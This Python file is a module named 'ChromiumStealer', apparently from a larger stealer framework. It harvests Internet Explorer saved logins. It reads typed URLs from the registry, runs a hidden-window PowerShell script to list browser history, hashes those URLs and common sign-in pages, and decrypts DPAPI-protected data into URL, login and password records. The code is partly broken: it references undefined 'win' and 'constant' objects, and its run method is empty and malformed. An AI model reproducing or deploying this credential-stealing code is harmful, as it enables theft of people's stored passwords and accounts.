import hashlib
import subprocess
import os


try: 
    import _subprocess as sub
    STARTF_USESHOWWINDOW = sub.STARTF_USESHOWWINDOW  # Not work on Python 3
    SW_HIDE = sub.SW_HIDE
except ImportError:
    STARTF_USESHOWWINDOW = subprocess.STARTF_USESHOWWINDOW
    SW_HIDE = subprocess.SW_HIDE

try: 
    import _winreg as winreg
except ImportError:
    import winreg

from config.manager import ModuleManager
    
class ChromiumStealer(ModuleManager):
    
    def __init__(self) -> None:
        super().__init__(module_name="ChromiumStealer")
        self.KEY_READ = 131097
        self.HKEY_CURRENT_USER = -2147483647
    
    def get_hash_table(self):
        urls = self.get_history()

        hash_tables = []
        for u in range(len(urls)):
            try:
                h = (urls[u] + '\0').encode('UTF-16LE')
                hash_tables.append([h, hashlib.sha1(h).hexdigest().lower()])
            except Exception:
                pass
        return hash_tables

    def get_history(self):
        urls = self.history_from_regedit()
        try:
            urls = urls + self.history_from_powershell()
        except Exception:
            pass

        urls = urls + ['https://www.facebook.com/', 'https://www.gmail.com/', 'https://accounts.google.com/', 'https://accounts.google.com/servicelogin']
        return urls
    
    def history_from_powershell(self):
        # From https://richardspowershellblog.wordpress.com/2011/06/29/ie-history-to-csv/
        cmdline = '''
        function get-iehistory {
        [CmdletBinding()]
        param ()
        
        $shell = New-Object -ComObject Shell.Application
        $hist = $shell.NameSpace(34)
        $folder = $hist.Self
        
        $hist.Items() | 
        foreach {
            if ($_.IsFolder) {
            $siteFolder = $_.GetFolder
            $siteFolder.Items() | 
            foreach {
                $site = $_
            
                if ($site.IsFolder) {
                $pageFolder  = $site.GetFolder
                $pageFolder.Items() | 
                foreach {
                    $visit = New-Object -TypeName PSObject -Property @{        
                        URL = $($pageFolder.GetDetailsOf($_,0))           
                    }
                    $visit
                }
                }
            }
            }
        }
        }
        get-iehistory
        '''
        command = ['powershell.exe', '/c', cmdline]
        info = subprocess.STARTUPINFO()
        info.dwFlags = STARTF_USESHOWWINDOW
        info.wShowWindow = SW_HIDE
        p = subprocess.Popen(command, startupinfo=info, stderr=subprocess.STDOUT, stdout=subprocess.PIPE,
                             stdin=subprocess.PIPE, universal_newlines=True)
        results, _ = p.communicate()

        urls = []
        for r in results.split('\n'):
            if r.startswith('http'):
                urls.append(r.strip())
        return urls

    def isx64machine(self):
        archi = os.environ.get("PROCESSOR_ARCHITEW6432", '')
        if '64' in archi:
            return True
        archi = os.environ.get("PROCESSOR_ARCHITECTURE", '')
        if '64' in archi:
            return True
        return False

    def OpenKey(self, key, path, index=0, access=131097):
        isx64 = self.isx64machine()
        if isx64:
            return winreg.OpenKey(key, path, index, access | winreg.KEY_WOW64_64KEY)
        else:
            return winreg.OpenKey(key, path, index, access)

    def history_from_regedit(self):
        urls = []
        try:
            hkey = self.OpenKey(self.HKEY_CURRENT_USER, 'Software\\Microsoft\\Internet Explorer\\TypedURLs')
        except Exception:
            return []

        num = winreg.QueryInfoKey(hkey)[1]
        for x in range(0, num):
            k = winreg.EnumValue(hkey, x)
            if k:
                urls.append(k[1])
        winreg.CloseKey(hkey)
        return urls
    
    def decipher_password(self, cipher_text, u):
        pwd_found = []
        
        # deciper the password
        pwd = win.Win32CryptUnprotectData(cipher_text, u, is_current_user=constant.is_current_user,
                                          user_dpapi=constant.user_dpapi)
        if not pwd:
            return []

        separator = b"\x00\x00"
        if pwd.endswith(separator):
            pwd = pwd[: -len(separator)]

        chunks_reversed = pwd.rsplit(separator)[::-1]  # <pwd_n>, <login_n>, ..., <pwd_0>, <login_0>, <SOME_SERVICE_DATA_CHUNKS>

        #  Filter out service data
        possible_passwords = [x for n, x in enumerate(chunks_reversed) if n % 2 == 0]
        possible_logins = [x for n, x in enumerate(chunks_reversed) if n % 2 == 1]
        for possible_login, possible_password in zip(possible_logins, possible_passwords):
            #  Service data starts with several blocks of "<2_bytes>\x00\x00<10_bytes>"
            if len(pwd_found) > 0 and len(possible_login) == 2 and len(possible_password) == 10:
                break

            try:
                possible_login_str = possible_login.decode('UTF-16LE')
                possible_password_str = possible_password.decode('UTF-16LE')
            except UnicodeDecodeError:
                if len(pwd_found) > 0:
                    #  Some passwords have been found. Assume this is service data.
                    break

                #  No passwords have been found. Assume login or password contains some chars which could not be decoded
                possible_login_str = str(possible_password)
                possible_password_str = str(possible_password)

            pwd_found.append({
                'URL': u.decode('UTF-16LE'),
                'Login': possible_login_str,
                'Password': possible_password_str
            })

        return pwd_found

    def run() -> None:
        pass
